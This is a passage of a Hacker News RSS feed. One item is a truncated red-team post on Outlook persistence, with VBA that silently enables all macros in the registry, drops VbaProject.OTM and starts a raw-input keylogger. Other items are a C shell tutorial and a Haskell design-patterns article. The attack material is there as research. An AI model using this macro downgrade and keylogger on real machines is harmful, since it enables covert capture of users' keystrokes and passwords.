</code></pre></div></div> <p>The main issue is that retrieving this information <strong>can take a really long time</strong> if the company is big (we are talking about ~5-10 minutes), so it is a bit unpractical to be used in a real scenario. However both approaches can be executed <strong>inside</strong> Outlook via OTM files as we will see below.</p>  <p>In the last years various persistence methods related to Outlook were released and implemented in the tool <strong><a href="https://github.com/sensepost/ruler">Ruler</a></strong>. These methods were based on the execution of VBA code via <a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/">Custom Forms</a> and <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/">Home Pages</a>. Both attacks are now patched, so we have to move forward.</p> <p>Recently <a href="https://twitter.com/domchell">Dominic Chell</a> published the article <a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a> where the persistence is achieved dropping a <strong>VbaProject.OTM</strong> file that is later loaded by Outlook. This is the path that we choosed here. But instead of using a payload to get a shell or parasite a process with our C2, we are going to create a keylogger in pure VBA <strong>:)</strong>.</p> <p>Outlook is one of the long term alive programs in an average office computer. It is launched since the workday beginning and is not closed until the worker leaves the office, so makes sense to use it as a keylogger. The plan is quite simple: we need to build an Excel file that modifies the registry (so Outlook can execute macros freely) and drops the OTM file with our keylogger.</p> <p>As the registry key is under <code>HKEY_CURRENT_USER</code> we do not need special privileges to modify the value (by default it is set at level 3 <em>Notifications for digitally signed macros, all other macros disabled</em>) so we enable the load and execution of macros by changing the value to 1 (<em>Enable all Macros</em>):</p> <div><div><pre><code><span>Sub</span> <span>disable_macro_security</span><span>()</span>
  <span>Dim</span> <span>myWS</span> <span>As</span> <span>Object</span>
  <span>Set</span> <span>myWS</span> <span>=</span> <span>VBA</span><span>.</span><span>CreateObject</span><span>(</span><span>"WScript.Shell"</span><span>)</span>
  <span>Dim</span> <span>name</span> <span>As</span> <span>String</span><span>,</span> <span>value</span> <span>As</span> <span>Integer</span><span>,</span> <span>stype</span> <span>As</span> <span>String</span>
  <span>name</span> <span>=</span> <span>"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span> <span>&amp;</span> <span>Application</span><span>.</span><span>Version</span> <span>&amp;</span> <span>"\Outlook\Security\Level"</span>
  <span>value</span> <span>=</span> <span>1</span>
  <span>stype</span> <span>=</span> <span>"REG_DWORD"</span>
  <span>myWS</span><span>.</span><span>RegWrite</span> <span>name</span><span>,</span> <span>value</span><span>,</span> <span>stype</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We use the Excel version (<code>Application.Version</code>) to calculate the right location of the key to be modified. After that the OTM file can be dropped to <code>Environ("appdata") &amp; "\Microsoft\Outlook\VbaProject.OTM"</code> (it can be packed inside a resource, form, or taken directly from internet and then read/unpack and dropped). It is nothing new, all the good ol‚Äô techniques to drop files apply here, let‚Äôs move to the OTM contents and the keylogger.</p> <p>For our keylogger we are going to use the function <strong><code>NtUserGetRawInputData</code></strong> that is not documented in the MSDN. But as usual: if something is not covered by Microsoft, go and check ReactOS. Luckily it is <a href="https://doxygen.reactos.org/d0/dc0/ntstubs_8c.html#ad041c37a6375f9be19cac8f4636d468e">documented</a>:</p> <div><div><pre><code><span>DWORD</span> <span>APIENTRY</span> <span>NtUserGetRawInputData</span> 	<span>(</span> 	<span>HRAWINPUT</span>  	<span>hRawInput</span><span>,</span>
		<span>UINT</span>  	<span>uiCommand</span><span>,</span>
		<span>LPVOID</span>  	<span>pData</span><span>,</span>
		<span>PUINT</span>  	<span>pcbSize</span><span>,</span>
		<span>UINT</span>  	<span>cbSizeHeader</span> 
	<span>)</span> 	
</code></pre></div></div> <p>Also we can see that it is exported by <a href="https://strontic.github.io/xcyclopedia/library/win32u.dll-7D649393F89A9DE3058162F8442130BC.html#win32udll">win32u.dll</a>, so our definition in VBA will be:</p> <div><div><pre><code><span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHeader</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>LongLong</span>
</code></pre></div></div> <p>Our approach will be the well-known technique of creating a window with a callback to snoop messages until we get a <code>WM_INPUT</code> and then use <code>NtUserGetRawInputData</code> to get the input data. To build the structures correctly (like <code>RAWKEYBOARD</code>) we can use <strong><code>offsetof</code></strong> as we described in our article <a href="https://adepts.of0x.cc/vba-tools/">Shedding light on creating VBA macros</a>, so we can check the size of each field and pick VBA types accordingly.</p> <p>Our macro has to be split in two parts</p> <ol> <li>The default module <code>ThisOutlookSession</code></li> <li>Another module created by us that we will rename to <code>Keylogger</code>.</li> </ol> <p>In <code>ThisOutlookSession</code> we only place the trigger that will execute our payload when Outlook starts:</p> <div><div><pre><code><span>Sub</span> <span>Application_Startup</span><span>()</span>
   <span>Keylogger</span><span>.</span><span>launcher</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We need to place the ‚Äúreal‚Äù payload inside another module to be allowed to use the operator <strong><a href="https://docs.microsoft.com/es-es/office/vba/language/reference/user-interface-help/invalid-use-of-addressof-operator">AddressOf</a></strong>, because we use it to set the callback to our window class. The <code>Keylogger</code> module code (remember: <strong>this is just a PoC</strong> that does not handle errors/exceptions, the intention of this code is just to exemplify how to build one):</p> <div><div><pre><code><span>'This can be hidden using DispCallFunc trick</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterClassEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"RegisterClassExA"</span> <span>(</span><span>pcWndClassEx</span> <span>As</span> <span>WNDCLASSEX</span><span>)</span> <span>As</span> <span>Integer</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>CreateWindowEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"CreateWindowExA"</span> <span>(</span><span>ByVal</span> <span>dwExStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>lpClassName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>lpWindowName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>dwStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>x</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>y</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nWidth</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nHeight</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>hWndParent</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hMenu</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hInstance</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lpParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DefWindowProc</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DefWindowProcA"</span> <span>(</span><span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsg</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wParam</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"GetMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>,</span> <span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMin</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMax</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>TranslateMessage</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DispatchMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DispatchMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetModuleHandle</span> <span>Lib</span> <span>"kernel32"</span> <span>Alias</span> <span>"GetModuleHandleA"</span> <span>(</span><span>ByVal</span> <span>lpModuleName</span> <span>As</span> <span>String</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterRawInputDevices</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>ByRef</span> <span>pRawInputDevices</span> <span>As</span> <span>RAWINPUTDEVICE</span><span>,</span> <span>ByVal</span> <span>uiNumDevices</span> <span>As</span> <span>Integer</span><span>,</span> <span>ByVal</span> <span>cbSize</span> <span>As</span> <span>Integer</span><span>)</span> <span>As</span> <span>Boolean</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHead‚Ä¶</span></code></pre></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adepts.of0x.cc/vba-outlook/">https://adepts.of0x.cc/vba-outlook/</a></em></p>]]>
            </description>
            <link>https://adepts.of0x.cc/vba-outlook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126067</guid>
            <pubDate>Sat, 13 Feb 2021 19:35:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Write a Shell in C]]>
            </title>
            <description>
<![CDATA[
Score 268 | Comments 75 (<a href="https://news.ycombinator.com/item?id=26126010">thread link</a>) | @mindcrime
<br/>
February 13, 2021 | https://brennan.io/2015/01/16/write-a-shell-in-c/ | <a href="https://web.archive.org/web/*/https://brennan.io/2015/01/16/write-a-shell-in-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<p><em>Stephen Brennan ‚Ä¢ 16 January 2015</em></p><p>It‚Äôs easy to view yourself as ‚Äúnot a <em>real</em> programmer.‚Äù  There are programs out
there that everyone uses, and it‚Äôs easy to put their developers on a pedestal.
Although developing large software projects isn‚Äôt easy, many times the basic
idea of that software is quite simple.  Implementing it yourself is a fun way to
show that you have what it takes to be a real programmer.  So, this is a
walkthrough on how I wrote my own simplistic Unix shell in C, in the hopes that
it makes other people feel that way too.</p>

<p>The code for the shell described here, dubbed <code>lsh</code>, is available on
<a href="https://github.com/brenns10/lsh">GitHub</a>.</p>

<p><strong>University students beware!</strong> Many classes have assignments that ask you to
write a shell, and some faculty are aware of this tutorial and code.  If you‚Äôre
a student in such a class, you shouldn‚Äôt copy (or copy then modify) this code
without permission.  And even then, I would <a href="https://brennan.io/2016/03/29/dishonesty/">advise</a> against heavily relying on this tutorial.</p>

<h2 id="basic-lifetime-of-a-shell">Basic lifetime of a shell</h2>

<p>Let‚Äôs look at a shell from the top down.  A shell does three main things in its
lifetime.</p>

<ul>
  <li><strong>Initialize</strong>: In this step, a typical shell would read and execute its
configuration files.  These change aspects of the shell‚Äôs behavior.</li>
  <li><strong>Interpret</strong>: Next, the shell reads commands from stdin (which could be
interactive, or a file) and executes them.</li>
  <li><strong>Terminate</strong>: After its commands are executed, the shell executes any
shutdown commands, frees up any memory, and terminates.</li>
</ul>

<p>These steps are so general that they could apply to many programs, but we‚Äôre
going to use them for the basis for our shell.  Our shell will be so simple that
there won‚Äôt be any configuration files, and there won‚Äôt be any shutdown command.
So, we‚Äôll just call the looping function and then terminate.  But in terms of
architecture, it‚Äôs important to keep in mind that the lifetime of the program is
more than just looping.</p>

<div><div><pre><code><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span>
<span>{</span>
  <span>// Load config files, if any.
</span>
  <span>// Run command loop.
</span>  <span>lsh_loop</span><span>();</span>

  <span>// Perform any shutdown/cleanup.
</span>
  <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here you can see that I just came up with a function, <code>lsh_loop()</code>, that will
loop, interpreting commands.  We‚Äôll see the implementation of that next.</p>

<h2 id="basic-loop-of-a-shell">Basic loop of a shell</h2>

<p>So we‚Äôve taken care of how the program should start up.  Now, for the basic
program logic: what does the shell do during its loop?  Well, a simple way to
handle commands is with three steps:</p>

<ul>
  <li><strong>Read</strong>: Read the command from standard input.</li>
  <li><strong>Parse</strong>: Separate the command string into a program and arguments.</li>
  <li><strong>Execute</strong>: Run the parsed command.</li>
</ul>

<p>Here, I‚Äôll translate those ideas into code for <code>lsh_loop()</code>:</p>

<div><div><pre><code><span>void</span> <span>lsh_loop</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span><span>;</span>
  <span>char</span> <span>**</span><span>args</span><span>;</span>
  <span>int</span> <span>status</span><span>;</span>

  <span>do</span> <span>{</span>
    <span>printf</span><span>(</span><span>"&gt; "</span><span>);</span>
    <span>line</span> <span>=</span> <span>lsh_read_line</span><span>();</span>
    <span>args</span> <span>=</span> <span>lsh_split_line</span><span>(</span><span>line</span><span>);</span>
    <span>status</span> <span>=</span> <span>lsh_execute</span><span>(</span><span>args</span><span>);</span>

    <span>free</span><span>(</span><span>line</span><span>);</span>
    <span>free</span><span>(</span><span>args</span><span>);</span>
  <span>}</span> <span>while</span> <span>(</span><span>status</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Let‚Äôs walk through the code.  The first few lines are just declarations.  The
do-while loop is more convenient for checking the status variable, because it
executes once before checking its value.  Within the loop, we print a prompt,
call a function to read a line, call a function to split the line into args, and
execute the args.  Finally, we free the line and arguments that we created
earlier.  Note that we‚Äôre using a status variable returned by <code>lsh_execute()</code> to
determine when to exit.</p>

<h2 id="reading-a-line">Reading a line</h2>

<p>Reading a line from stdin sounds so simple, but in C it can be a hassle.  The
sad thing is that you don‚Äôt know ahead of time how much text a user will enter
into their shell.  You can‚Äôt simply allocate a block and hope they don‚Äôt exceed
it.  Instead, you need to start with a block, and if they do exceed it,
reallocate with more space.  This is a common strategy in C, and we‚Äôll use it to
implement <code>lsh_read_line()</code>.</p>

<div><div><pre><code><span>#define LSH_RL_BUFSIZE 1024
</span><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
  <span>int</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>*</span><span>buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>char</span><span>)</span> <span>*</span> <span>bufsize</span><span>);</span>
  <span>int</span> <span>c</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
    <span>// Read a character
</span>    <span>c</span> <span>=</span> <span>getchar</span><span>();</span>

    <span>// If we hit EOF, replace it with a null character and return.
</span>    <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>EOF</span> <span>||</span> <span>c</span> <span>==</span> <span>'\n'</span><span>)</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
      <span>return</span> <span>buffer</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>c</span><span>;</span>
    <span>}</span>
    <span>position</span><span>++</span><span>;</span>

    <span>// If we have exceeded the buffer, reallocate.
</span>    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
      <span>buffer</span> <span>=</span> <span>realloc</span><span>(</span><span>buffer</span><span>,</span> <span>bufsize</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The first part is a lot of declarations.  If you hadn‚Äôt noticed, I prefer to
keep the old C style of declaring variables before the rest of the code.  The
meat of the function is within the (apparently infinite) <code>while (1)</code> loop.  In
the loop, we read a character (and store it as an <code>int</code>, not a <code>char</code>, that‚Äôs
important!  EOF is an integer, not a character, and if you want to check for it,
you need to use an <code>int</code>.  This is a common beginner C mistake.).  If it‚Äôs the
newline, or EOF, we null terminate our current string and return it.  Otherwise,
we add the character to our existing string.</p>

<p>Next, we see whether the next character will go outside of our current buffer
size.  If so, we reallocate our buffer (checking for allocation errors) before
continuing.  And that‚Äôs really it.</p>

<p>Those who are intimately familiar with newer versions of the C library may note
that there is a <code>getline()</code> function in <code>stdio.h</code> that does most of the work we
just implemented.  To be completely honest, I didn‚Äôt know it existed until after
I wrote this code.  This function was a GNU extension to the C library until
2008, when it was added to the specification, so most modern Unixes should have
it now.  I‚Äôm leaving my existing code the way it is, and I encourage people to
learn it this way first before using <code>getline</code>.  You‚Äôd be robbing yourself of a
learning opportunity if you didn‚Äôt!  Anyhow, with <code>getline</code>, the function
becomes easier:</p>

<div><div><pre><code><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>ssize_t</span> <span>bufsize</span> <span>=</span> <span>0</span><span>;</span> <span>// have getline allocate a buffer for us
</span>
  <span>if</span> <span>(</span><span>getline</span><span>(</span><span>&amp;</span><span>line</span><span>,</span> <span>&amp;</span><span>bufsize</span><span>,</span> <span>stdin</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>){</span>
    <span>if</span> <span>(</span><span>feof</span><span>(</span><span>stdin</span><span>))</span> <span>{</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>  <span>// We recieved an EOF
</span>    <span>}</span> <span>else</span>  <span>{</span>
      <span>perror</span><span>(</span><span>"readline"</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>line</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is not 100% trivial because we still need to check for EOF or errors while
reading. EOF (end of file) means that either we were reading commands from a
text file which we‚Äôve reached the end of, or the user typed Ctrl-D, which
signals end-of-file. Either way, it means we should exit successfully, and if
any other error occurs, we should fail after printing the error.</p>

<h2 id="parsing-the-line">Parsing the line</h2>

<p>OK, so if we look back at the loop, we see that we now have implemented
<code>lsh_read_line()</code>, and we have the line of input.  Now, we need to parse that
line into a list of arguments.  I‚Äôm going to make a glaring simplification here,
and say that we won‚Äôt allow quoting or backslash escaping in our command line
arguments.  Instead, we will simply use whitespace to separate arguments from
each other.  So the command <code>echo "this message"</code> would not call echo with a
single argument <code>this message</code>, but rather it would call echo with two
arguments: <code>"this</code> and <code>message"</code>.</p>

<p>With those simplifications, all we need to do is ‚Äútokenize‚Äù the string using
whitespace as delimiters.  That means we can break out the classic library
function <code>strtok</code> to do some of the dirty work for us.</p>

<div><div><pre><code><span>#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
</span><span>char</span> <span>**</span><span>lsh_split_line</span><span>(</span><span>char</span> <span>*</span><span>line</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_TOK_BUFSIZE</span><span>,</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>**</span><span>tokens</span> <span>=</span> <span>malloc</span><span>(</span><span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
  <span>char</span> <span>*</span><span>token</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>line</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>while</span> <span>(</span><span>token</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>token</span><span>;</span>
    <span>position</span><span>++</span><span>;</span>

    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_TOK_BUFSIZE</span><span>;</span>
      <span>tokens</span> <span>=</span> <span>realloc</span><span>(</span><span>tokens</span><span>,</span> <span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
      <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>

    <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>NULL</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>}</span>
  <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>tokens</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>If this code looks suspiciously similar to <code>lsh_read_line()</code>, it‚Äôs because it
is!  We are using the same strategy of having a buffer and dynamically expanding
it.  But this time, we‚Äôre doing it with a null-terminated array of pointers
instead of a null-terminated array of characters.</p>

<p>At the start of the function, we begin tokenizing by calling <code>strtok</code>.  It
returns a pointer to the first token.  What <code>strtok()</code> actually does is return
pointers to within the string you give it, and place <code>\0</code> bytes at the end of
each token.  We store each pointer in an array (buffer) of character
pointers.</p>

<p>Finally, we reallocate the array of pointers if necessary.  The process repeats
until no token is returned by <code>strtok</code>, at which point we null-terminate the
list of tokens.</p>

<p>So, once all is said and done, we have an array of tokens, ready to execute.
Which begs the question, how do we do that?</p>



<p>Now, we‚Äôre really at the heart of what a shell does.  Starting processes is the
main function of shells.  So writing a shell means that you need to know exactly
what‚Äôs going on with processes and how they start.  That‚Äôs why I‚Äôm going to take
us on a short diversion to discuss processes in Unix.</p>

<p>There are only two ways of starting processes on Unix.  The first one (which
almost doesn‚Äôt count) is by being Init.  You see, when a Unix computer boots,
its kernel is loaded.  Once it is loaded and initialized, the kernel starts only
one process, which is called Init.  This process runs for the entire length of
time that the computer is on, and it manages loading up the rest of the
processes that you need for your computer to be useful.</p>

<p>Since most programs aren‚Äôt Init, that leaves only one practical way for
processes to get started: the <code>fork()</code> system call.  When ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://brennan.io/2015/01/16/write-a-shell-in-c/">https://brennan.io/2015/01/16/write-a-shell-in-c/</a></em></p>]]>
            </description>
            <link>https://brennan.io/2015/01/16/write-a-shell-in-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126010</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lambda the Ultimate Pattern Factory (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26126002">thread link</a>) | @coolgeek
<br/>
February 13, 2021 | https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html | <a href="https://web.archive.org/web/*/https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    
    <div>
    <p><em>Posted on November 24, 2018
    
        by Thomas Mahler
    </em></p></div>

<p><a href="https://circleci.com/gh/thma/LtuPatternFactory"><img src="https://circleci.com/gh/thma/LtuPatternFactory.svg?style=svg" alt="CircleCI"></a></p>
<p>My first programming languages were Lisp, Scheme, and ML. When I later started to work in OO languages like C++ and Java I noticed that idioms that are standard vocabulary in functional programming (fp) were not so easy to achieve and required sophisticated structures. Books like <a href="https://en.wikipedia.org/wiki/Design_Patterns">Design Patterns: Elements of Reusable Object-Oriented Software</a> were a great starting point to reason about those structures. One of my earliest findings was that several of the GoF-Patterns had a stark resemblance of structures that are built into in functional languages: for instance the strategy pattern corresponds to higher order functions in fp (more details see <a href="#strategy">below</a>).</p>
<p>Recently, while re-reading through the <a href="https://wiki.haskell.org/Typeclassopedia">Typeclassopedia</a> I thought it would be a good exercise to map the structure of software <a href="https://en.wikipedia.org/wiki/Software_design_pattern#Classification_and_list">design-patterns</a> to the concepts found in the Haskell type class library and in functional programming in general.</p>
<p>By searching the web I found some blog entries studying specific patterns, but I did not come across any comprehensive study. As it seemed that nobody did this kind of work yet I found it worthy to spend some time on it and write down all my findings on the subject.</p>
<p>I think this kind of exposition could be helpful if you are:</p>
<ul>
<li>a programmer with an OO background who wants to get a better grip on how to implement complexer designs in functional programming</li>
<li>a functional programmer who wants to get a deeper intuition for type classes.</li>
<li>studying the <a href="https://wiki.haskell.org/Typeclassopedia">Typeclassopedia</a> and are looking for an accompanying reading providing example use cases and working code.</li>
</ul>
<blockquote>
<p>This project is work in progress, so please feel free to contact me with any corrections, adjustments, comments, suggestions and additional ideas you might have. Please use the <a href="https://github.com/thma/LtuPatternFactory/issues">Issue Tracker</a> to enter your requests.</p>
</blockquote>
<h2 id="table-of-contents">Table of contents</h2>
<ul>
<li><a href="#lambda-the-ultimate-pattern-factory">Lambda the ultimate pattern factory</a></li>
<li><a href="#the-patternopedia">The Patternopedia</a>
<ul>
<li><a href="#data-transfer-object--functor">Data Transfer Object ‚Üí Functor</a></li>
<li><a href="#singleton--applicative">Singleton ‚Üí Applicative</a></li>
<li><a href="#pipeline--monad">Pipeline ‚Üí Monad</a></li>
<li><a href="#nullobject--maybe-monad">NullObject ‚Üí Maybe Monad</a></li>
<li><a href="#interpreter--reader-monad">Interpreter ‚Üí Reader Monad</a> <!--  * [? ‚Üí MonadFail](#--monadfail)--></li>
<li><a href="#aspect-weaving--monad-transformers">Aspect Weaving ‚Üí Monad Transformers</a> <!--* [? ‚Üí MonadFix](#--monadfix) --></li>
<li><a href="#composite--semigroup--monoid">Composite ‚Üí SemiGroup ‚Üí Monoid</a> <!--* [? ‚Üí Alternative, MonadPlus, ArrowPlus](--alternative-monadplus-arrowplus) --></li>
<li><a href="#visitor--foldable">Visitor ‚Üí Foldable</a></li>
<li><a href="#iterator--traversable">Iterator ‚Üí Traversable</a> <!-- * [? ‚Üí Bifunctor](#--bifunctor) --></li>
<li><a href="#the-pattern-behind-the-patterns--category">The Pattern behind the Patterns ‚Üí Category</a> <!--* [? ‚Üí Arrow](#--arrow) --></li>
<li><a href="#fluent-api--comonad">Fluent Api ‚Üí Comonad</a></li>
</ul></li>
<li><a href="#beyond-type-class-patterns">Beyond type class patterns</a>
<ul>
<li><a href="#dependency-injection--parameter-binding-partial-application">Dependency Injection ‚Üí Parameter Binding, Partial Application</a></li>
<li><a href="#command--functions-as-first-class-citizens">Command ‚Üí Functions as First Class Citizens</a></li>
<li><a href="#adapter--function-composition">Adapter ‚Üí Function Composition</a></li>
<li><a href="#template-method--type-class-default-functions">Template Method ‚Üí type class default functions</a></li>
<li><a href="#creational-patterns">Creational Patterns</a>
<ul>
<li><a href="#abstract-factory--functions-as-data-type-values">Abstract Factory ‚Üí functions as data type values</a></li>
<li><a href="#builder--record-syntax-smart-constructor">Builder ‚Üí record syntax, smart constructor</a></li>
</ul></li>
</ul></li>
<li><a href="#functional-programming-patterns">Functional Programming Patterns</a>
<ul>
<li><a href="#higher-order-functions">Higher Order Functions</a></li>
<li><a href="#map-reduce">Map Reduce</a> <!-- * [Continuation Passing](#continuation-passing) --></li>
